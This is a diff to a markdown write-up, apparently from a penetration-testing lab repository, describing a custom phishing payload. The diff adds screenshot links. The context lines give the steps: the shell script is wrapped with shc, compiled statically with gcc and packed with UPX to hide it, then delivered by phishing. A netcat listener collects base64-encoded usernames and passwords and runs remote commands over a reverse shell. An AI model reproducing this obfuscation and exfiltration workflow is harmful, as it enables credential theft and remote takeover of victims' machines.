@@ -66,11 +66,14 @@
    - **-f payload.sh: to the input script file.**
    - **-U: Unsets the environment variable LD_LIBRARY_PATH before executing the compiled binary. This helps prevent library path manipulation**
 15. **This generates 2 files, The compiled binary executable to be used instead of original script and The C source code generated from the shell script. This is used to compile the binary.**
+![](https://github.com/brindhasham/Lab_PT/blob/main/Custom%20Phishing%20Payload%20with%20Anti-Detection%20Features/screensnips/payload1.png)
 16. `gcc -static -o payload_binary payload.sh.x.c`
     - **This above compiles the C source file `payload.sh.x.c` into a statically linked binary executable named `payload_binary`**
 17. **Now we have `payload_binary` which runs the logic of `payload.sh` without exposing the script**
 18. **`upx --best --ultra-brute payload_binary`**
      - **This compresses the binary file  using UPX (Ultimate Packer for executables) with maximum compression settings**
+![](https://github.com/brindhasham/Lab_PT/blob/main/Custom%20Phishing%20Payload%20with%20Anti-Detection%20Features/screensnips/payload2.png)
+
 
 **Now we finally have the payload_binary ready to be transferred to the attacker system by various phising methods**
 
@@ -80,6 +83,7 @@
      nc -nlvp <attacker_port_specified_in_the_script> > creds_comm.txt
      ```
 21. **When the victim executes the script at, which prompts for username and password, the data will be exfiltrated in base64 format using a reverse shell. Since I have also included RCE using the reverse shell, the commands from the attacker will be executed at the victim's end and the results will be stored in `creds_comm.txt`**
+    ![](https://github.com/brindhasham/Lab_PT/blob/main/Custom%20Phishing%20Payload%20with%20Anti-Detection%20Features/screensnips/exfiltrated_data.png)
     
      
  ### This concludes successful custom creation of payload, obfuscation and data-exfiltration using reverse shell
